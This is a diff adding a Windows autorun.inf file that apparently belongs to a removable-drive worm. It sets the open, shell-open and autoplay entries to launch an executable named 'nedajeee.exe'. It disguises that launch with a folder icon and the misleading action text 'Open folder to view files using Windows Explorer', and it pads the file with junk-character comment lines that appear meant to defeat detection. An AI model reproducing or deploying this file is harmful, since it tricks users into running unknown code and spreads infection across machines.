@@ -1,0 +1,14 @@
+[autorun
+;dlSAKDL:akj;dokwdliksjdasklD?ajs/dJDAwjd:K;odkA:dkjAW:DKWADJwiDjmaw£ÊË×ñêàë÷äñêàäîïêœÄ×Î£Äïœî÷¼×ääêà÷äêîœèêïäîêŒ×ÄŒÄÊ×ãêôœåÎÔÈÎ×ÀÊÔÑË×Ê£ãôÀÎ×Ã£ñ÷êã¼ôÅÎÃÊŒ×ÃÊå¼ôÑÊËÀ¼ôÑÔ
+open=SRCEMOJE///nedajeee.exe
+;êÄêôëÄÑÊÔŒÅÊÔÊÀôêñàÔÊŒÅÎÔÊË×ÀÑ¼ôèœÏÌÊ£×Ôœ
+icon=%SystemRoot%\system32\SHELL32.dll,4
+;Ë×ÔÊÀÑ×ÊÔœêôÀê¼ô¼œêôÀË×ÔÊñà÷ÔÊŒÎÊÔÅÎ×ÊôÀŒÅ×
+action=Open folder to view files using Windows Explorer
+;ËÔŽ×ÀÑôë÷ê÷ôñêôî÷Œ¼ÔÊÔî÷àêô÷ÊÔŒÎÔÊå×Ô
+Shell\open\command=SRCEMOJE///nedajeee.exe
+;ÊË×ÔÀÑêôÊŒÔêÀ×ôê¼œ÷î¼ôœ¼ôœËÔ£œôë÷Œ×ôêœîô
+shell\open\command=SRCEMOJE///nedajeee.exe
+;ÊË×ÔÀñêôîœêŒÎÔÀÔŒêôœÔêŒÔÊŒÀ
+USEAUTOPLAY=1
+:ÊÔËÀêôœÎêôŒ×ÎÊ£ÔÀÏÎÔÊÀŒôêÀŒÔÎÊœÔÎÊŒÔÀŒ£ÔŒÀÎ×¼ôœÔÊŒÎÔÊŒ
